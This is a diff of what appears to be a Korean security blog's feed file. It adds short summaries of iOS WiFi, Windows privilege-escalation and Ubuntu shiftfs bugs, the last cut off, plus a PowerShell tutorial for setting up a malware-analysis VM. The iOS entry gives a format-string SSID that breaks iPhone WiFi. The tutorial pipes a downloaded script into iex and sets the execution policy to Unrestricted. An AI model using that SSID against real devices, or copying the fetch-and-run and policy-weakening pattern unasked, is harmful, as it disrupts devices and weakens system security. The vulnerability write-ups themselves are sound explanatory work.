@@ -4,6 +4,216 @@
   
   
   <entry>
+    <title>[하루한줄] IOS wifi RCE 0-day</title>
+    <link href="/2021/07/19/fabu1ous/2021-07-19/"/>
+    <url>/2021/07/19/fabu1ous/2021-07-19/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.zecops.com/research/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/">Meet WiFiDemon – iOS WiFi RCE 0-Day Vulnerability, and a Zero-Click Vulnerability That Was Silently Patched</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>iOS 14.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>iOS 14의 Wi-Fi-Demon에서 발생하는 Format string bug가 패치되었습니다. 공식 공지에는 WiFi DoS로 공개되었지만 ZecOps Mobile EDR Research의 분석 결과에 따르면 zero-click RCE가 가능합니다. Wi-Fi-Demon은 와이파이 연결과 관련된 프로토콜을 처리하는 system daemon으로 root 권한으로 동작하기 때문에 해당 취약점을 악용해 sandbox escape 및 탈옥에 사용될 수도 있습니다.</p><p><code>%p%s%s%s%s%n</code> 과 같이 SSID(이름)에 format string이 포함된 WiFi에 접속한다면 iPhone의 WiFi 및 핫스팟 기능에 영구적인 장애가 발생합니다. WiFi-Demon은 접속한 WiFi의 SSID를 캐쉬 하고 재시작할 때마다 그 파일에서 SSID를 읽기 때문에 재부팅을 해도 해결할 수 없습니다. WiFi DoS는 iOS 14.4에서 패치되었지만 최신 버전인 14.6에선 여전히 zero-click RCE를 이용한 exploit을 할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Fabu1ous</tag>
+      
+      <tag>rce</tag>
+      
+      <tag>ios</tag>
+      
+      <tag>wifi</tag>
+      
+      <tag>dos</tag>
+      
+      <tag>apple</tag>
+      
+      <tag>iphone</tag>
+      
+      <tag>zero-click</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자! Part 2</title>
+    <link href="/2021/07/18/idioth/setting_malware_vm_part2/"/>
+    <url>/2021/07/18/idioth/setting_malware_vm_part2/</url>
+    
+    <content type="html"><![CDATA[<p><img src="/2021/07/18/idioth/setting_malware_vm_part2/thumbnail.png"></p><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요. idioth입니다. 요즘 날씨가 너무 더워서 아무것도 하기가 싫네요… COVID-19도 심해져서 집에서 공부를 하고 있는데 악성코드 분석을 하려고 보니 환경이 세팅된 가상 머신이 없네요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%201.png"></p><p>급하게 깔아버린 Windows입니다. 아무것도 없군요. 하나하나 설치하기가 귀찮습니다. 하지만 저번 시간에 우리가 진행했던 것이 있죠? 오늘은 애플리케이션 설치 및 바탕화면 바로가기, 작업표시줄 고정을 해봅시다!!!</p><center><img src="./SeekPng.com_anime-face-png_136767.png" width="50%" height="50%"></center><p>하지만 그것조차 너무 하기가 귀찮네요…… 그래도 한 번 시작한 일은 마무리 지어야 하니 시작해봅시다.</p><h1 id="Chocolatey"><a href="#Chocolatey" class="headerlink" title="Chocolatey"></a>Chocolatey</h1><p>Linux 계열 운영체제에서 자동 설정 스크립트를 만들 때 패키지 매니저를 사용하여 간단하게 install 합니다.</p><pre><code class="hljs sql">sudo apm <span class="hljs-keyword">install</span> &lt;<span class="hljs-keyword">package</span>&gt;</code></pre><p>하지만 WIndows Powershell이나 명령 프롬프트에서는 그러한 기능이 딱히 생각이 나지 않습니다. 일일이 찾아가서 다운로드를 눌러 Windows Installer 등을 실행하여 설치하는 경우가 많죠.</p><p>간단하게 설치하고 싶은 분들! 소프트웨어 자동화를 하고 싶은 분들!을 위해 Windows에는 <a href="https://chocolatey.org/">chocolatey</a>가 있습니다!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%202.png"></p><p>chocolatey는 우분투의 apm처럼 windows에서 패키지를 명령줄로 다운로드할 수 있게 만들어줍니다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%203.png"></p><p>세상에 그럼 설치를 해보도록 할까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%204.png"></p><p>‘Get Started’를 클릭하면 아래와 같이 설치하는 방법이 나와있습니다. 영어로 적혀 있고 상당히 길죠? 제가 요약해드리도록 하겠습니다. Powershell을 관리자 권한으로 실행한 후 <code>Set-ExecutionPolicy Unrestricted</code>(추후 실행할 우리의 스크립트를 위함 ㅎ)로 설정하고 다음 명령을 복사해 실행해주면 됩니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span> <span class="hljs-literal">-Force</span>; [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="hljs-operator">-bor</span> <span class="hljs-number">3072</span>; <span class="hljs-built_in">iex</span> ((<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://chocolatey.org/install.ps1&#x27;</span>))</code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%205.png"></p><p>chocolatey의 설치가 완료되었다면 어떤 패키지가 있는지 확인해볼 수 없겠죠? Find Packages를 클릭하여 어떤 것들이 있는지 확인해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%206.png"></p><p>8533개의 패키지가 있다네요! ida도 있는지 확인을 해볼까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%207.png"></p><p>IDA free의 최신 버전이 올라와있는 것을 확인할 수 있습니다! 사실 첫 스크립트를 작성하고 게시글을 준비할 때 hex-rays 기능이 없는 IDA만 업로드되어 있어서 함수를 짜서 다운로드를 하도록 하였으나… 게시글을 올릴 시점이 되니까 업데이트가 되어 있더라고요? 하핫…</p><p>아무튼! chocolatey를 설치하고 난 후에는 apm을 사용하는 것처럼 <code>choco install &lt;package&gt;</code>를 통해 애플리케이션을 설치할 수 있습니다. 세상에 너무 간편하잖아? 업데이트도 똑같이 <code>choco upgrade &lt;package&gt;</code>를 통해 진행할 수 있어요. chocolatey 자체를 업데이트한다면 <code>choco upgrade chocolatey</code>를 해주면 됩니다.</p><p>설치된 애플리케이션들은 보통 <code>%ProgramData%\chocolatey\lib</code>의 하위 폴더에 생성되니 기억해두세요! (Wireshark, HxD, VSCode 등은 본래의 설치 경로에 설치됩니다.)</p><h1 id="Chocolatey를-활용한-애플리케이션-다운로드"><a href="#Chocolatey를-활용한-애플리케이션-다운로드" class="headerlink" title="Chocolatey를 활용한 애플리케이션 다운로드"></a>Chocolatey를 활용한 애플리케이션 다운로드</h1><p>우리에겐 chocolatey가 있으므로 다운로드는 걱정할 필요가 없습니다. 다운로드할 패키지 이름만 정해주면 알아서 다운로드해줄 테니까요.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>&#123;    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    &#123;        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    &#125;&#125;</code></pre><p><code>$packages</code>에 존재하는 패키지는 취향에 따라 추가, 제거, 수정하셔서 사용하시면 됩니다. 매우 매우 간단하죠? 이제 이 스크립트를 실행하여 애플리케이션을 다운로드해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%208.png"></p><p><code>download_apps</code> 함수만 실행했을 뿐인데 알아서 다 다운로드 받아주고 있네요. 호호 기특한 녀석입니다. 그러면 이제 설치된 파일들을 입맛에 따라 바탕화면 바로가기, 작업 표시줄 고정을 해줘야겠죠?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%209.png"></p><blockquote><p><del>아 벌써 귀찮다.. 그냥 침대에 누워서 쉬고 싶다…</del></p></blockquote><h1 id="바탕화면-바로가기-만들기"><a href="#바탕화면-바로가기-만들기" class="headerlink" title="바탕화면 바로가기 만들기"></a>바탕화면 바로가기 만들기</h1><p>Powershell 스크립트를 사용해 바탕화면 바로가기를 만드는 작업은 매우 간단합니다. WScript를 통해 CreateShortcut만 해주면 돼요!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()&#125;</code></pre><p><code>$src</code>는 바로가기를 만들 파일의 경로, <code>$filename</code>은 바로가기로 생성될 파일 이름입니다. 바탕화면에 생성할 것이기 때문에 <code>$dst</code>는 바탕화면으로 고정이 되어있지만, 다른 곳에 만드는 걸 선호한다! 하시면 수정하셔도 되고 <code>$dst</code> 자체를 파라미터로 받으셔도 상관없습니다. :)</p><p>요로코롬 해주면 간단하게 바탕화면 바로가기도 생성 가능!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2010.png"></p><p>뭐야… 이 부분은 너무 쉽잖아? 작업 표시줄 고정도 단숨에 해치워 버려야겠군…</p><h1 id="작업-표시줄-고정하기"><a href="#작업-표시줄-고정하기" class="headerlink" title="작업 표시줄 고정하기"></a>작업 표시줄 고정하기</h1><p>바탕화면 바로가기는 매우 매우 단순했죠? 작업 표시줄 고정하는 것도 매우 매우 단순합니다! 3줄이면 돼요!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)&#125;</code></pre><p>자 이제 이걸 실행해주면 됩니다! 아하하 너무 쉽다!</p><p>.</p><p>.</p><p>.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2011.png"></p><p>놀라울 만큼 아무 일도 일어나지 않았습니다. 왜지??? 무슨 일이지??? <code>$pin.Verbs()</code>를 통해 확인을 해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2012.png"></p><p>없습니다. 네. 작업 표시줄에 고정이 없어요.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2013.png"></p><p>여기에는 있는데 왜? 왜 저기에는 없는 거지…??? 하지만 인생에 불가능은 없는 법. 없으면 만들어주면 되지 않을까요?</p><p>아래의 코드를 통해 <code>Verbs()</code>에 Taskbar pin 기능을 활성화해봅시다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler<span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)</code></pre><p><code>$value_data</code>는 <code>Windows.taskbarpin</code>의 <code>ExplorerCommandHandler</code>의 값을 가져옵니다. 그 후 <code>HKEY_CURRENT_USER</code>에 <code>Classes</code>에 <code>shell</code>과 <code>taskbarpin</code>을 만들어서 해당 핸들러의 값을 추가해주면 됩니다. <code>$pin.verbs()</code>로 확인을 해볼까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2014.png"></p><p>taskbarpin이 추가된 것을 확인할 수 있습니다! 이제 <code>$pin.InvokeVerb(&quot;taskbarpin&quot;)</code>을 통해 <code>taskbarpin</code>을 호출해봅시다. 제발 되기를 바라며!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2015.png"></p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2016.png"></p><p>실험 삼아 vscode의 경로를 줬는데 성공적으로 추가되었네요! 이제 원하는 것들을 작업 표시줄에 추가해주면 됩니다. 하지만 그전에…</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2017.png"></p><p>여기에 우리가 만든 <code>taskbarpin</code>이 남아있네요…? 이 녀석의 레지스트리를 지워야겠어요.</p><pre><code class="hljs powershell"><span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)<span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)&#125;</code></pre><p>짠. 이렇게 그냥 지워버리면 됩니다!</p><h1 id="전체-코드"><a href="#전체-코드" class="headerlink" title="전체 코드"></a>전체 코드</h1><p>이제 완성을 해버렸네요. <code>application.psm1</code>의 전체 코드를 확인해봅시다!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>&#123;    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    &#123;        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    &#125;&#125;<span class="hljs-comment"># refer: https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()&#125;<span class="hljs-comment"># refer: https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler    <span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)    &#123;        <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)    &#125;&#125;</code></pre><p>생각보다 기능이 많이 없죠? 하지만 이걸로도 간단하게 자동화 스크립트를 만들 수 있다는 사실! 이전에 만들었던 <code>install.ps1</code>에 원하는 부분을 추가하고 실행을 해봅시다. +_+</p><pre><code class="hljs powershell"><span class="hljs-comment"># download apps</span>download_apps<span class="hljs-comment"># create desktop shortcut</span>create_desktop_shortcut <span class="hljs-string">&quot;C:\Program Files\Wireshark\Wireshark.exe&quot;</span> <span class="hljs-string">&quot;Wireshark&quot;</span><span class="hljs-comment"># pin taskbar</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp64.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\die\tools\die_win64_portable\die.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\PeStudio\tools\pestudio\pestudio.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\Program Files\Microsoft VS Code\Code.exe&quot;</span></code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2018.png"></p><p>짠! 우리가 고대하던 것들이 스크립트 하나로 끝났습니다. 작업 표시줄에도 고정되었고, Wireshark도 바탕화면 바로가기로 만들어졌네요!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2019.png"></p><p>하얗게 불태워 버렸습니다.</p><h1 id="마치며…"><a href="#마치며…" class="headerlink" title="마치며…"></a>마치며…</h1><p>기술적으로 어려운 부분도 아니고 단지 처음 만들고 찾아보기가 굉장<del>~</del>히 귀찮은 작업이라고 생각합니다. 사실상 기능들은 stack overflow에 다 나와 있어서 현재 버전에 사용되지 않으면 사용되는 부분을 찾거나 하면 되거든요. 해당 스크립트는 <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">MSEdge on Win10 (x64) Stable 1809 버전</a>을 기준으로 작성되었습니다. 악성코드 분석을 할 때 항상 저걸 사용해서 하거든요 :)</p><p>따라서 현재 OS 버전 21H1에서는 동작하지 않을 수도 있습니다. (실제로 로컬에 테스트를 했을 때 작업표시줄 고정이 안되더군요… 일시적인 건가? 아무튼 이것 때문에 삽질을 좀 했습니다… ㅠㅠ)</p><p>추가적으로 아쉬운 부분은 Windbg Preview 버전을 자동으로 설치하고 싶었는데, Store apps를 스크립트로 옮기는 과정이 복잡하더군요. 다운로드 링크를 직접 주는 사이트를 발견해서 작업을 해보았으나, 권한이 없다는 말이 계속 떠서… ㅜㅜ 깔끔하게 포기했습니다. 나중에 chocolatey에 추가되길 간절히 기원하고 있습니다.</p><p>잡담이 길었네요! 제가 많이 사용하는 애플리케이션만 추가해놓고, 저는 보통 시작 - 검색 기능으로 애플리케이션을 실행하는 것을 선호해서 (깔끔한 걸 좋아합니다.) 사실 바탕화면 바로가기나 작업 표시줄 고정 기능을 많이 사용하지 않아요. 이 부분도 취향에 맞게 수정하셔서 사용하시면 됩니다.</p><p>전체 소스 코드는 <a href="https://github.com/idioth/malvm">github</a>에 업로드되어 있으니, 많은 구경 부탁드리고 피드백 또한 언제나 환영입니다! 감사합니다 :)</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/">https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</a></p><p><a href="https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10">https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Research</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>idioth</tag>
+      
+      <tag>malware</tag>
+      
+      <tag>powershell</tag>
+      
+      <tag>automated</tag>
+      
+      <tag>virtual machine</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] Windows: CreateProcessWithLogon Write Restricted Service EoP</title>
+    <link href="/2021/07/16/j0ker/2021-07-16/"/>
+    <url>/2021/07/16/j0ker/2021-07-16/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2194">https://bugs.chromium.org/p/project-zero/issues/detail?id=2194</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Vista 이후로 <code>Windows Service Hardening</code>이라는 미티게이션이 추가되었었습니다. 이 미티게이션의 기능 중 하나가 <code>Write Restrict token</code>인데, 이는 해당 토큰을 가진 프로세서에서는 다른 리소스에 쓰기가 제한되는 미티게이션입니다. 현재 Windows 10에서는 대략 10개의 서비스에 해당 미티게이션이 적용되어 있다고 합니다.</p><p>James Forshaw가 이번에 찾은 취약점(비록 마이크로소프트가 취약점이라고 인정하진 않았지만…)은 이 미티게이션을 우회할 수 있습니다. <code>Write Restriction</code>이 걸린 서비스 프로세스에서 <code>CreateProcessWithLogon</code> 함수에 <code>LOGON_NERCREDENTIALS_ONLY</code> 플래그를 세팅하고 호출할 시 Write Restriction이 적용되지 않은 새로운 프로세스를 실행할 수 있습니다. 새로운 프로세스는 Write Restriction이 걸려있지 않을 뿐 아니라 <code>INTERACTIVE</code> 그룹 SID가 추가됩니다. 또한 이 취약점은 <code>LOCAL SERVICE</code>, <code>NETWORK SERVICE</code> 또는 <code>Virtual Service Account</code> 계정에서도 트리거가 가능하며 <code>SeImpersonatePrivilege</code>나 <code>SeAssignPrimaryTokenPrivilege</code> 같은 권한이 필요하지도 않습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>eop</tag>
+      
+      <tag>windows</tag>
+      
+      <tag>j0ker</tag>
+      
+      <tag>token</tag>
+      
+      <tag>createprocesswithlogon</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-3492: Ubuntu Shiftfs driver double free vulnerability</title>
+    <link href="/2021/07/15/idioth/2021-07-15/"/>
+    <url>/2021/07/15/idioth/2021-07-15/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.synacktiv.com/publications/exploitation-of-a-double-free-vulnerability-in-ubuntu-shiftfs-driver-cve-2021-3492.html">EXPLOITATION OF A DOUBLE FREE VULNERABILITY IN UBUNTU SHIFTFS DRIVER (CVE-2021-3492)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu Groovy (20.10, kernel 5.8.0-50.56 이전 버전)</li><li>Ubuntu Focal (20.04, kernel 5.4.0-72.80 이전 버전)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Pwn2Own Vancouver 2021에서 Ubuntu Groovy (20.10)과 Ubuntu Focal (20.04)의 Shiftfs 드라이버에서 double free 버그가 발견되었습니다.</p><p>shiftfs는 파일 시스템 드라이버로 디렉터리를 bind-mount 하고 마운트한 user namespace owner의 맵을 통해 UID와 GID를 shift 할 수 있는 overlay 종류의 파일 시스템입니다. shiftfs는 특정 ioctl로 핸들링되며 허용된 ioctl을 전달받을 시 <code>shiftfs_real_ioctl</code>을 호출합니다. <code>BTRFS_IOC_SNAP_CREATE</code> ioctl이 사용되면 <code>shiftfs_btrfs_ioctl_fd_replace</code> 함수는 userspace에서 kernel space로 구조체를 복사하여 <code>btrfs_ioctl_vol_args</code> 구조체에 포함된 파일 디스크립터를 bottom 파일 시스템의 inode에 연결된 새 디스크립터로 교체하여 legacy btrfs ioctl을 래핑합니다.</p><p>이 ioctl이 shiftfs 파일에서 수행되면 핸들링 코드는 <code>btrfs_ioctl_vol_args</code>를 userpsace에서 kernel space로 복사합니다. 이 구조체에서 <code>fd</code>를 교체한 후 다시 userspace로 복사됩니다. 복사가 실패할 경우, <code>copy_to_user</code> 함수는 남아있는 바이트를 반환하여 양수 값을 반환합니다. 해당 함수를 호출하는 <code>shiftfs_real_ioctl</code>은 음수 값인지 확인하여 오류가 났는지 확인하여 오류가 발생하더라도 <code>shiftfs_btrfs_ioctl_fd_restore</code>를 호출하여 다른 <code>copy_to_user</code>를 실행하고 <code>btrfs_ioctl_vol_args</code> 구조체를 userpace로 보낸 다음 free 합니다.</p><p><code>shiftfs_btrfs_ioctl_fd_restore</code>를 두 번 호출하면 같은 fd를 두 번 닫고 같은 구조체가 두 번 free 